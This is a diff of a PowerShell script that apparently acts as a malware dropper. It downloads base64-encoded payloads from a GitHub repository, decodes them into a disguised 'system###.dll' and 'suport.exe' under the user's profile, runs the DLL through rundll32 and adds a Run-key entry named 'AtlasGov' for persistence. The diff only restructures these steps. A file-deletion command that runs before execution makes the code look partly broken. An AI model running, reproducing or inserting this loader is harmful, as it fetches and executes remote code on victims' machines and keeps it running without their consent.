@@ -1,17 +1,34 @@
 $call = "SimpleServer"
+
 $path_new = $env:USERPROFILE+"\pdf\";
+
 If (-not (Test-Path $path_new)){
+
 	New-Item -Path $path_new -ItemType Directory | Out-Null;
+
 }
+
 $file = "system"+ (Get-Random -Maximum 999) + ".dll"
+
 $location = $path_new + $file;
 $location2 = $path_new + "suport" + ".exe";
-$uri = "https://github.com/iskww/Atlas/raw/main/win32.b64";
-$uri2 = "https://github.com/iskww/Atlas/raw/main/reports.b64";
-[System.IO.File]::WriteAllBytes($location,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri)))
-[System.IO.File]::WriteAllBytes($location2,[Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString($uri2)))
+
+$uri_1 = "https://github.com/iskww/Atlas/raw/main/win32.b64";
+$uri_2 = "https://github.com/iskww/Atlas/raw/main/reports.b64";
+
+$b64_1 = (New-Object System.Net.WebClient).DownloadString($uri_1);
+$b64_2 = (New-Object System.Net.WebClient).DownloadString($uri_2);
+
+$raw_1 = [Convert]::FromBase64String($b64_1)
+$raw_2 = [Convert]::FromBase64String($b64_2)
+
+
+[System.IO.File]::WriteAllBytes($location,$raw_1)
+[System.IO.File]::WriteAllBytes($location2,$raw_2)
+
+
 Set-Location $path_new
 Remove-Item *.*
 Start-Process rundll32.exe -ArgumentList "$file, $call" ;
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name "AtlasGov" -Value $location2 -ErrorAction SilentlyContinue
 
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name "AtlasGov" -Value $location2 -ErrorAction SilentlyContinue
